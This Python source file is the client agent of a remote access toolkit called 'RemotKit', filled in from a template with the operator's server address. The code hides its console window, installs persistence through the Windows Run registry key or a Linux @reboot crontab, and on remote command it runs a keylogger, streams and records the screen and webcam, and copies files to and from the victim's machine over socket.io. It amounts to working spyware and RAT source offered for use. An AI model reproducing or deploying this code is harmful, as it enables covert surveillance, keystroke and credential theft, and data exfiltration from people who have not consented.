#!/usr/bin/env python3
"""
REMOTKIT - Remote Access Toolkit Client Agent
"""

import sys
import os
import platform
import socket
import time
import threading
import subprocess
import base64
import io
import json
from datetime import datetime
from threading import Thread

SERVER_URL = "http://{{SERVER_IP}}:{{SERVER_PORT}}"
CLIENT_ID = "{{CLIENT_ID}}"
OS_TARGET = "{{OS_TYPE}}"
AUTO_START = {{AUTO_START}}


def hide_console():
    """Sembunyikan console window (Windows only)"""
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass


# HAPUS FUNGSI move_to_appdata() - TIDAK DIPERLUKAN LAGI


if __name__ == "__main__":
    # Hanya hide console untuk .exe
    if getattr(sys, 'frozen', False):
        hide_console()

# Import dependencies
try:
    import pyautogui
    from PIL import Image
    HAS_PYA = True
except:
    HAS_PYA = False

try:
    import socketio
    sio = socketio.Client()
except:
    print("ERROR: pip install python-socketio")
    sys.exit(1)


def get_info():
    return {
        "id": CLIENT_ID,
        "name": socket.gethostname(),
        "os": platform.system(),
        "ip": socket.gethostbyname(socket.gethostname())
    }


def list_directory(path):
    try:
        items = []
        for item in os.listdir(path):
            full = os.path.join(path, item)
            items.append({
                'name': item,
                'path': full,
                'is_dir': os.path.isdir(full),
                'size': os.path.getsize(full) if os.path.isfile(full) else 0
            })
        items.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
        return items
    except Exception as e:
        return str(e)


def upload_file(file_path, content):
    try:
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        with open(file_path, 'wb') as f:
            f.write(base64.b64decode(content))
        return f"Uploaded to {file_path}"
    except Exception as e:
        return str(e)


def install_autostart():
    path = os.path.abspath(sys.argv[0])
    if getattr(sys, "frozen", False):
        path = sys.executable
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
                winreg.SetValueEx(reg, "RemotkitClient", 0, winreg.REG_SZ, path)
            return True
        elif platform.system() == "Linux":
            os.system(f'(crontab -l 2>/dev/null; echo "@reboot {path}") | crontab -')
            return True
        return False
    except:
        return False


def uninstall_client():
    system = platform.system()
    result = ""
    try:
        if system == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
                winreg.DeleteValue(reg, "RemotkitClient")
            result = "Registry removed"
        elif system == "Linux":
            os.system('crontab -l | grep -v "@reboot" | crontab -')
            result = "Crontab removed"
        else:
            result = "Auto-start removal not supported"
    except Exception as e:
        result = f"Failed: {str(e)}"
    
    sio.emit("uninstall_result", {"result": result})
    sio.disconnect()
    return result


# ========== KEYLOGGER ==========
keylog_buffer = []
keylog_running = False
keylog_listener = None
pynput = False
try:
    from pynput import keyboard
    pynput = True
except:
    pass


def start_keylogger():
    global keylog_running, keylog_listener, keylog_buffer
    if not pynput:
        return "pynput not installed"
    if keylog_running:
        return "Already running"
    keylog_running = True
    keylog_buffer = []
    
    def on_press(key):
        global keylog_buffer
        try:
            if hasattr(key, 'char') and key.char:
                keylog_buffer.append(key.char)
            elif hasattr(key, 'name'):
                special = {'space': ' ', 'enter': '[ENTER]\n', 'backspace': '[BACKSPACE]', 'tab': '[TAB]'}
                keylog_buffer.append(special.get(key.name, f'[{key.name.upper()}]'))
        except:
            pass
    
    keylog_listener = keyboard.Listener(on_press=on_press)
    keylog_listener.start()
    return "Keylogger started"


def stop_keylogger():
    global keylog_running, keylog_listener, keylog_buffer
    if not pynput:
        return "pynput not installed"
    if keylog_listener:
        keylog_listener.stop()
        keylog_listener = None
    keylog_running = False
    if keylog_buffer:
        data = ''.join(keylog_buffer)
        keylog_buffer = []
        sio.emit('keylog_data', {'data': data})
    return "Keylogger stopped"


# ========== DESKTOP ==========
desktop_active = False
desktop_thread = None
desktop_recording = False
desktop_frames = []


def capture_screen():
    if not HAS_PYA:
        return None
    ss = pyautogui.screenshot()
    buf = io.BytesIO()
    ss.save(buf, format="JPEG", quality=50)
    return base64.b64encode(buf.getvalue()).decode()


def capture_screen_array():
    if not HAS_PYA:
        return None
    import numpy as np
    return np.array(pyautogui.screenshot())


def desktop_loop():
    global desktop_active, desktop_recording, desktop_frames
    while desktop_active:
        try:
            frame = capture_screen()
            if frame:
                sio.emit('desktop_frame', {'image': frame})
                if desktop_recording:
                    arr = capture_screen_array()
                    if arr is not None:
                        desktop_frames.append(arr)
        except:
            pass
        time.sleep(0.1)


def start_desktop():
    global desktop_active, desktop_thread
    if desktop_active:
        return "Already streaming"
    desktop_active = True
    desktop_thread = Thread(target=desktop_loop, daemon=True)
    desktop_thread.start()
    return "Desktop started"


def stop_desktop():
    global desktop_active
    desktop_active = False
    return "Desktop stopped"


def start_desktop_recording():
    global desktop_recording, desktop_frames
    if not desktop_active:
        return "Start desktop first"
    if desktop_recording:
        return "Already recording"
    desktop_recording = True
    desktop_frames = []
    return "Desktop recording started"


def stop_desktop_recording():
    global desktop_recording, desktop_frames
    if not desktop_recording:
        return "Not recording"
    desktop_recording = False
    time.sleep(0.5)
    
    if desktop_frames:
        try:
            import cv2
            import numpy as np
            import tempfile
            
            temp_dir = tempfile.gettempdir()
            temp_file = os.path.join(temp_dir, f"temp_desktop_{int(time.time())}.mp4")
            
            h, w = desktop_frames[0].shape[:2]
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            out = cv2.VideoWriter(temp_file, fourcc, 10.0, (w, h))
            for frame in desktop_frames:
                out.write(cv2.cvtColor(frame, cv2.COLOR_RGB2BGR))
            out.release()
            
            with open(temp_file, 'rb') as f:
                data = base64.b64encode(f.read()).decode()
            os.remove(temp_file)
            
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            fn = f"desktop_{ts}_{CLIENT_ID}.mp4"
            sio.emit('desktop_recording_data', {'filename': fn, 'data': data})
            desktop_frames = []
            return f"Desktop recording saved: {fn}"
        except Exception as e:
            return f"Error saving recording: {e}"
    return "Desktop recording stopped (no frames)"


# ========== CAMERA ==========
camera_active = False
camera_thread = None
camera_recording = False
camera_frames = []


def start_camera():
    global camera_active, camera_thread
    if camera_active:
        return "Camera already streaming"
    try:
        import cv2
        camera_active = True
        
        def cam_loop():
            global camera_active, camera_recording, camera_frames
            cap = cv2.VideoCapture(0)
            while camera_active and cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    _, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                    sio.emit('camera_frame', {'image': base64.b64encode(buf).decode()})
                    
                    if camera_recording:
                        camera_frames.append(frame.copy())
                time.sleep(0.05)
            cap.release()
        
        camera_thread = Thread(target=cam_loop, daemon=True)
        camera_thread.start()
        return "Camera started"
    except ImportError:
        return "OpenCV not installed"


def stop_camera():
    global camera_active, camera_recording
    camera_active = False
    camera_recording = False
    return "Camera stopped"


def start_camera_recording():
    global camera_recording, camera_frames
    if not camera_active:
        return "Start camera first"
    if camera_recording:
        return "Already recording"
    camera_recording = True
    camera_frames = []
    return "Camera recording started"


def stop_camera_recording():
    global camera_recording, camera_frames
    if not camera_recording:
        return "Not recording"
    camera_recording = False
    time.sleep(0.5)
    
    if camera_frames:
        try:
            import cv2
            import numpy as np
            import tempfile
            
            temp_dir = tempfile.gettempdir()
            temp_file = os.path.join(temp_dir, f"temp_camera_{int(time.time())}.mp4")
            
            h, w = camera_frames[0].shape[:2]
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            out = cv2.VideoWriter(temp_file, fourcc, 10.0, (w, h))
            for frame in camera_frames:
                out.write(frame)
            out.release()
            
            with open(temp_file, 'rb') as f:
                data = base64.b64encode(f.read()).decode()
            os.remove(temp_file)
            
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            fn = f"camera_{ts}_{CLIENT_ID}.mp4"
            sio.emit('camera_recording_data', {'filename': fn, 'data': data})
            camera_frames = []
            return f"Camera recording saved: {fn}"
        except Exception as e:
            return f"Error saving recording: {e}"
    return "Camera recording stopped (no frames)"


# ========== SOCKET EVENTS ==========
@sio.on("connect")
def on_connect():
    print(f"[CLIENT] Connected to {SERVER_URL}")
    sio.emit("register", get_info())
    
    def heartbeat():
        while True:
            time.sleep(25)
            try:
                sio.emit("ping")
            except:
                break
    
    Thread(target=heartbeat, daemon=True).start()


@sio.on("disconnect")
def on_disconnect():
    print("[CLIENT] Disconnected")


@sio.on("command")
def on_command(data):
    cmd = data.get("type")
    cid = data.get("id")
    d = data.get("data", {})
    CHUNK_SIZE = 512 * 1024
    wait_id = d.get("wait_id")
    
    if cmd == "info":
        sio.emit("result", {"id": cid, "result": json.dumps(get_info()), "wait_id": wait_id})
    elif cmd == "uninstall":
        uninstall_client()
        return
    elif cmd == "listdir":
        path = d.get("path", "C:\\")
        res = list_directory(path)
        if isinstance(res, list):
            sio.emit("listdir_result", {"id": cid, "files": res, "current_path": path, "wait_id": wait_id})
        else:
            sio.emit("listdir_result", {"id": cid, "error": res, "wait_id": wait_id})
    elif cmd == "download":
        file_path = d.get("path", "")
        if os.path.exists(file_path) and os.path.isfile(file_path):
            file_size = os.path.getsize(file_path)
            if file_size <= 10 * 1024 * 1024:
                if file_size <= CHUNK_SIZE:
                    with open(file_path, 'rb') as f:
                        content = base64.b64encode(f.read()).decode()
                    sio.emit("download_result", {
                        "id": cid, "content": content,
                        "filename": os.path.basename(file_path), "wait_id": wait_id
                    })
                else:
                    total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
                    with open(file_path, 'rb') as f:
                        for i in range(total_chunks):
                            chunk_data = f.read(CHUNK_SIZE)
                            chunk_b64 = base64.b64encode(chunk_data).decode()
                            sio.emit("download_chunk", {
                                "id": cid, "chunk": chunk_b64, "chunk_index": i,
                                "total_chunks": total_chunks, "filename": os.path.basename(file_path),
                                "wait_id": wait_id
                            })
                            time.sleep(0.05)
            else:
                sio.emit("download_result", {"id": cid, "error": "File too large >10MB", "wait_id": wait_id})
        else:
            sio.emit("download_result", {"id": cid, "error": "File not found", "wait_id": wait_id})
    elif cmd == "upload":
        sio.emit("result", {"id": cid, "result": upload_file(d.get("path", ""), d.get("content", "")), "wait_id": wait_id})
    elif cmd == "start_keylogger":
        sio.emit("result", {"id": cid, "result": start_keylogger(), "wait_id": wait_id})
    elif cmd == "stop_keylogger":
        sio.emit("result", {"id": cid, "result": stop_keylogger(), "wait_id": wait_id})
    elif cmd == "start_desktop":
        sio.emit("result", {"id": cid, "result": start_desktop(), "wait_id": wait_id})
    elif cmd == "stop_desktop":
        sio.emit("result", {"id": cid, "result": stop_desktop(), "wait_id": wait_id})
    elif cmd == "start_desktop_recording":
        sio.emit("result", {"id": cid, "result": start_desktop_recording(), "wait_id": wait_id})
    elif cmd == "stop_desktop_recording":
        sio.emit("result", {"id": cid, "result": stop_desktop_recording(), "wait_id": wait_id})
    elif cmd == "start_camera":
        sio.emit("result", {"id": cid, "result": start_camera(), "wait_id": wait_id})
    elif cmd == "stop_camera":
        sio.emit("result", {"id": cid, "result": stop_camera(), "wait_id": wait_id})
    elif cmd == "start_camera_recording":
        sio.emit("result", {"id": cid, "result": start_camera_recording(), "wait_id": wait_id})
    elif cmd == "stop_camera_recording":
        sio.emit("result", {"id": cid, "result": stop_camera_recording(), "wait_id": wait_id})


# ========== MAIN ==========
if __name__ == "__main__":
    print("=" * 50)
    print("RemotKit Client Agent v1.0.0")
    print(f"OS: {OS_TARGET} | Server: {SERVER_URL}")
    
    if AUTO_START:
        install_autostart()
    
    while True:
        try:
            sio.connect(SERVER_URL)
            sio.wait()
        except Exception as e:
            print(f"Connection error: {e}")
            time.sleep(5)